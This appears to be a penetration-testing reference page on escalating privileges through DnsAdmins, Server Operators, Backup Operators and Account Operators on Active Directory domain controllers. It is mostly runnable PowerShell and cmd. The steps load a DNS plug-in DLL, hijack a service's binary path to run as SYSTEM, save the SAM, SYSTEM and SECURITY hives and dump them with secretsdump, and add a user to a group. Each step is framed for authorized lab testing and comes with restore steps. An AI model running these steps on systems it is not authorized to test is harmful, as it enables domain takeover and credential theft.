# Privileged AD groups and DC host rights

[← AD quick reference](../05-active-directory.md) · [Local token privileges](../windows/token-groups.md) · [Object rights](object-rights.md) · [DC credential access](credential-access.md)

Resolve the group to its SID, scope, actual members, and affected host. Then check the current token and the particular operation. A domain-group membership is not a general substitute for service, registry, file, or directory-object permissions.

## Establish scope and the active token

```powershell
whoami /all
whoami /groups
whoami /priv
hostname
Get-CimInstance Win32_ComputerSystem | Select-Object Name,Domain,DomainRole
```

DomainRole `4` or `5` identifies a DC. From an AD-module shell:

```powershell
$DC = 'dc01.corp.example'
Get-ADGroup -Identity 'Server Operators' -Server $DC -Properties GroupScope,member |
    Format-List Name,SID,GroupScope,member
Get-ADGroupMember -Identity 'Server Operators' -Server $DC -Recursive
Get-ADPrincipalGroupMembership -Identity '<USER>' -Server $DC |
    Select-Object Name,SID,GroupScope
```

Use localized names or SIDs when names differ. BUILTIN groups on a DC and local groups on a member server have different scope. Directory membership can change before an existing logon token changes; establish a fresh intended logon after a membership edit. [Microsoft AD security groups](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups).

| Group or right | Useful lead | Required confirmation |
| --- | --- | --- |
| DnsAdmins / delegated DNS administration | DNS plug-in configuration | DNS role, configuration right, reachable valid DLL, and a usable load/restart trigger |
| Server Operators on a DC | Service or backup operations | Exact service DACL, account, and start/stop/configuration rights |
| Backup Operators / SeBackupPrivilege | Backup-mode reads and registry saves | Present privilege, a tool using backup semantics, and access to the required live/snapshot data |
| Account Operators | Control over some nonprotected accounts/groups | Effective target ACL, protected-object restrictions, and a useful resulting permission |
| Event Log Readers | Accessible event data | Exact channel access and relevant events; membership does not grant secret memory access |

For local SeImpersonate/SeDebug/SeRestore/SeTakeOwnership paths, use [Windows token rights](../windows/token-groups.md).

## DnsAdmins: configuration, trigger, and restoration

The DNS server can be configured to load a server-level plug-in DLL. Confirm the DNS service's architecture, account, and access to the configured path. DNS administration does not automatically grant SCM restart rights. A missing or incompatible plug-in can prevent DNS from starting, so use a prevalidated lab plug-in and retain a working restore path. [DNS plug-in configuration contract](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723), [DnsAdmins author research](https://www.semperis.com/blog/dnsadmins-revisited/).

On the selected DNS server, capture existing configuration and service state before changing anything:

```powershell
$DnsServer = 'dc01.corp.example'
$KeyPath = 'HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters'
$Key = Get-Item -LiteralPath $KeyPath
$HadValue = $Key.GetValueNames() -contains 'ServerLevelPluginDll'
$DnsBefore = [pscustomobject]@{
    HadValue = $HadValue
    Value = $Key.GetValue('ServerLevelPluginDll',$null,`
        [Microsoft.Win32.RegistryValueOptions]::DoNotExpandEnvironmentNames)
    Kind = if ($HadValue) { $Key.GetValueKind('ServerLevelPluginDll').ToString() } else { $null }
    State = (Get-Service DNS).Status.ToString()
}
$DnsBefore | Export-Clixml '.\dns-before.xml'
sc.exe qc DNS
sc.exe sdshow DNS
accesschk.exe -accepteula -c -v '<YOUR-USER-OR-GROUP>' DNS
Get-Acl -LiteralPath $KeyPath | Format-List Owner,AccessToString
```

Remote DNS-RPC configuration and local registry access are separate surfaces. If this account cannot read the original setting, obtain it through an available authorized configuration read before writing a replacement. Confirm a local registry recovery route with an appropriately privileged lab operator before restarting: DNS-RPC restoration can become unavailable when a failed plug-in leaves DNS stopped. Do not guess that the original value was absent.

Example lab prerequisites: `C:\ProgramData\LabDnsProof\proof.dll` is already reachable/readable by the DNS service, matches its architecture and plug-in contract, and produces only a known identity/proof file. The DLL's exports and dependencies were validated on an equivalent disposable DNS server. An arbitrary DLL filename or a generic shellcode DLL is insufficient evidence of a working plug-in.

```cmd
dnscmd.exe dc01.corp.example /config /serverlevelplugindll C:\ProgramData\LabDnsProof\proof.dll
reg.exe query HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
```

Check each native exit code and the stored value before restarting; PowerShell `-ErrorAction Stop` does not make legacy native failures terminating. Preserve expandable registry strings without environment expansion. [Registry raw-value access](https://learn.microsoft.com/en-us/dotnet/api/microsoft.win32.registrykey.getvalue).

Trigger only the already-confirmed route. For a lab account with SCM stop and start rights, restart on the selected server:

```powershell
Stop-Service DNS -ErrorAction Stop
Start-Service DNS -ErrorAction Stop
Get-Service DNS
Get-Content 'C:\ProgramData\LabDnsProof\identity.txt'
```

Check that the recorded identity came from the DNS process, that DNS is running, and that a known lab name still resolves. If the service fails to start, restore the plug-in setting before retrying. The older DNS-RPC reload technique described in research has build-dependent failure behavior; it is not a universal substitute for restart access.

Restore the **original value**, or clear the setting if it was absent:

```powershell
$Saved = Import-Clixml '.\dns-before.xml'
if ($Saved.HadValue -and $Saved.Value) {
    dnscmd.exe $DnsServer /config /serverlevelplugindll $Saved.Value
} else {
    dnscmd.exe $DnsServer /config /serverlevelplugindll
}
if ($LASTEXITCODE -ne 0) { throw 'DNS-RPC restore failed; use the confirmed local recovery route.' }
reg.exe query HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
```

The [no-path dnscmd form](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd) clears the plug-in configuration. If DNS-RPC is unavailable, or presence/type differs from the backup, use the already-confirmed local registry recovery route on the DNS server:

```powershell
if ($Saved.HadValue) {
    New-ItemProperty -LiteralPath $KeyPath -Name 'ServerLevelPluginDll' `
        -PropertyType $Saved.Kind -Value $Saved.Value -Force | Out-Null
} elseif ((Get-Item -LiteralPath $KeyPath).GetValueNames() -contains 'ServerLevelPluginDll') {
    Remove-ItemProperty -LiteralPath $KeyPath -Name 'ServerLevelPluginDll'
}
Get-ItemProperty -LiteralPath $KeyPath -Name 'ServerLevelPluginDll' -ErrorAction SilentlyContinue
```

Verify value, type, and presence against the backup. Restart to unload the proof plug-in where required and return DNS to its original running/stopped state. Remove the DLL and proof files only after configuration restoration and unload are verified. Test name resolution again.

## Server Operators: exact service rights, benign execution proof

Membership is a reason to inspect services on the DC. Configuration, start, stop, ownership, and DACL rights remain separate. Use an enabled, stable, noncritical own-process lab service running as LocalSystem, with no dependencies, dependents, or load-order group. This example additionally requires authorized access to the WMI/CIM service provider's `Change` method and a restoration path. [Microsoft service access rights](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

```powershell
$ServiceName = 'LabSvc'
$Before = Get-CimInstance Win32_Service -Filter "Name='$ServiceName'" -ErrorAction Stop
if ($Before.StartMode -eq 'Disabled' -or $Before.ServiceType -ne 'Own Process') {
    throw 'Select an enabled own-process lab service.'
}
if (@('Running','Stopped') -notcontains $Before.State) { throw 'Wait for a stable service state.' }
$Controller = Get-Service $ServiceName -ErrorAction Stop
$Registry = Get-ItemProperty -LiteralPath "HKLM:\SYSTEM\CurrentControlSet\Services\$ServiceName" -ErrorAction Stop
if ($Before.StartName -ne 'LocalSystem' -or $Before.DesktopInteract -or
    $Controller.RequiredServices.Count -ne 0 -or $Controller.DependentServices.Count -ne 0 -or
    $Registry.Group -or $Registry.DependOnGroup -or $Registry.DependOnService) {
    throw 'This proof requires a noninteractive LocalSystem service without dependencies or a load-order group.'
}
$Before | Select-Object Name,PathName,StartName,StartMode,State,ServiceType,DisplayName,ErrorControl,DesktopInteract |
    Export-Clixml '.\LabSvc-before.xml'
sc.exe qc $ServiceName
sc.exe query $ServiceName
sc.exe sdshow $ServiceName
accesschk.exe -accepteula -c -v '<YOUR-USER-OR-GROUP>' $ServiceName
```

Confirm `SERVICE_CHANGE_CONFIG`, the additional CIM/provider access, and start permission. If running, also confirm stop permission. The following writes a unique identity file in a path already confirmed writable by the service and readable by the operator. Structured CIM arguments preserve embedded command-line quotes across PowerShell versions:

```powershell
$ProofPath = 'C:\Users\Public\LabServiceProof.txt'
if (Test-Path -LiteralPath $ProofPath) { throw 'Choose a new proof filename.' }
if ($Before.State -eq 'Running') {
    Stop-Service $ServiceName -ErrorAction Stop
    (Get-Service $ServiceName).WaitForStatus('Stopped',[TimeSpan]::FromSeconds(20))
}
$ProofCommand = 'C:\Windows\System32\cmd.exe /d /c "whoami /all > C:\Users\Public\LabServiceProof.txt"'
$Change = Invoke-CimMethod -InputObject $Before -MethodName Change `
    -Arguments @{PathName=$ProofCommand} -ErrorAction Stop
if ($Change.ReturnValue -ne 0) { throw "Service change failed: $($Change.ReturnValue)" }
$Current = Get-CimInstance Win32_Service -Filter "Name='$ServiceName'" -ErrorAction Stop
if ($Current.PathName -cne $ProofCommand) { throw 'Stored proof command differs; restore before starting.' }
foreach ($Property in @('StartName','StartMode','ServiceType','DisplayName','ErrorControl','DesktopInteract')) {
    if ($Current.$Property -cne $Before.$Property) { throw "$Property changed; restore before starting." }
}
sc.exe start $ServiceName
# Capture $LASTEXITCODE and service state; a dispatcher failure needs output verification below.
Get-Content -LiteralPath $ProofPath
```

`cmd.exe` does not implement the service dispatcher protocol. The SCM can report a launch/control error even when the process ran and wrote evidence; verify the file, identity, timing, and current service state. A failure without proof is not successful escalation. [Service process contract](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicectrldispatchera).

Restore the exact original command line, including arguments and quoting:

```powershell
$Saved = Import-Clixml '.\LabSvc-before.xml' -ErrorAction Stop
(Get-Service $ServiceName).WaitForStatus('Stopped',[TimeSpan]::FromSeconds(20))
$Current = Get-CimInstance Win32_Service -Filter "Name='$ServiceName'" -ErrorAction Stop
$Restore = Invoke-CimMethod -InputObject $Current -MethodName Change `
    -Arguments @{PathName=$Saved.PathName} -ErrorAction Stop
if ($Restore.ReturnValue -ne 0) { throw "Service restore failed: $($Restore.ReturnValue)" }
$Restored = Get-CimInstance Win32_Service -Filter "Name='$ServiceName'" -ErrorAction Stop
if ($Restored.PathName -cne $Saved.PathName) { throw 'Original command line was not restored.' }
foreach ($Property in @('StartName','StartMode','ServiceType','DisplayName','ErrorControl','DesktopInteract')) {
    if ($Restored.$Property -cne $Saved.$Property) { throw "$Property differs from the backup; retain recovery files." }
}
if ($Saved.State -eq 'Running') {
    Start-Service $ServiceName -ErrorAction Stop
    (Get-Service $ServiceName).WaitForStatus('Running',[TimeSpan]::FromSeconds(20))
}
if ((Get-Service $ServiceName).Status.ToString() -ne $Saved.State) { throw 'Original state was not restored.' }
Remove-Item -LiteralPath $ProofPath -ErrorAction Stop
```

If the service was originally stopped, leave it stopped. Recheck `sc.exe qc` against the backup, including the original absence of dependencies/load-order group. Do not delete the backup when a restore check fails. Native `sc.exe` command-line quoting differs between legacy and newer PowerShell argument passing; the structured `Change` method avoids that ambiguity but needs its own provider access. Omitted `Change` parameters have provider-specific semantics; the guarded example must not be generalized to services with another account, dependencies, or a shared process. [Win32_Service.Change](https://learn.microsoft.com/en-us/windows/win32/cimwin32prov/change-method-in-class-win32-service), [PowerShell native argument parsing](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_parsing). General service workflows are in [service permissions](../windows/service-permissions.md) and [service binary hijacking](../windows/service-binary-hijacking.md).

## Backup Operators: distinguish host secrets from domain secrets

Check `whoami /priv` for a present backup privilege and whether the chosen tool enables/uses it. Backup-mode file access does not imply permission to create a VSS snapshot or start a service. For local registry material:

```cmd
reg.exe save HKLM\SAM C:\Temp\sam.save
reg.exe save HKLM\SYSTEM C:\Temp\system.save
reg.exe save HKLM\SECURITY C:\Temp\security.save
```

```bash
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
```

Use a new existing writable output directory and check each command's result. A normal file read may ignore the backup privilege; backup-aware tools request the required access semantics. [Microsoft backup privilege](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants).

On a DC, the local SAM does not contain the domain's full account database; it includes local recovery-account material. Domain secrets require the NTDS/SYSTEM or replication workflow in [AD credential access](credential-access.md). Keep cached verifiers, local NT hashes, service secrets, and domain keys distinct using [Windows credential access](../windows/credential-access.md).

No hive extraction changes the account password, but it creates sensitive files. Verify the analysis copy before removing only the files created for this exercise; preserve required evidence in protected storage.

## Account Operators: verify a useful nonprotected target

Investigate ordinary accounts and groups with useful downstream rights. Protected administrative objects are not a universal reset/group-add route for Account Operators. Inspect the exact ACL and the resulting resource right; `adminCount` alone can be stale. [Group restrictions](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#account-operators).

Example: a confirmed writable, nonprotected `LabShareReaders` group grants access to one lab share. Capture direct members and check that the controlled user is not already a member:

```powershell
$Group = Get-ADGroup 'LabShareReaders' -Server $DC -Properties member
$Group | Select-Object DistinguishedName,SID,member | Export-Clixml '.\group-before.xml'
$Member = Get-ADUser 'operator' -Server $DC
if ($Group.member -contains $Member.DistinguishedName) { throw 'Already a member; do not remove it later.' }
Add-ADGroupMember -Identity $Group -Members $Member -Server $DC
Get-ADGroupMember -Identity $Group -Server $DC
```

Establish a fresh intended credential/logon context and perform the known share read. Then remove only the added direct membership and confirm the original member set:

```powershell
Remove-ADGroupMember -Identity $Group -Members $Member -Server $DC -Confirm:$false
$AfterMembers = (Get-ADGroup $Group -Server $DC -Properties member).member
Compare-Object @($Group.member) @($AfterMembers)
```

No difference confirms this member set on the queried DC. If there were concurrent edits, retain them. Password resets are a different, disruptive operation: knowing a reset right does not give you the old password to restore. Prefer reversible group/attribute proofs where those satisfy the finding.

## Failure and cleanup checklist

| Symptom | Check next |
| --- | --- |
| Group visible, operation denied | Active token, nested membership, host scope, exact ACL, logon type, and deny-only group state |
| DNS configuration succeeds, plug-in does not run | Architecture/exports/dependencies, service-account path access, actual trigger, and DNS logs |
| Service configuration succeeds, start fails | Separate start/stop rights, current state, stored quoting, dispatcher behavior, and proof output |
| Backup read/save denied | Present privilege, enabling/backup semantics, output path, and live-file locks/snapshot prerequisites |
| Group edit succeeds, resource still denied | Fresh authentication, replication/DC choice, actual resource ACL, and nested-group/token scope |

Record exactly what changed: configuration values, memberships, service state, proof files, and any imported resources. Restore introduced changes before deleting files they still reference.

## Version and validation notes

Sources and Windows command semantics were reviewed on 2026-10-02. Use installed `dnscmd /?`, `sc.exe` help, and `Get-Help <CMDLET> -Full`; confirm DNS/OS build, token privileges, and AD/SCM rights in the lab. DNS plug-in loading, service proofs, and restoration are source-reviewed and pending isolated Windows/DC validation.
